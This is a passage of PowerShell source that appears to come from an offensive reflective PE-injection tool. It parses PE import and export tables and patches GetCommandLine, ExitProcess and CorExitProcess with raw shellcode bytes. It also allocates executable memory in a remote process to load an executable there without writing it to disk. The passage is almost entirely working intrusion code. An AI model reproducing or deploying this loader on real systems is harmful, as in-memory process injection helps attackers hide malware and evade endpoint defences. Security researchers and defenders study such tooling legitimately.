                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $ProcedureName = ''
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([Int64]$OriginalThunkRefVal -lt 0)
                    {
                        $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
                    }
                    else
                    {
                        if($ProcedureName -is [string])
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
                        }
                        else
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
                        }
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
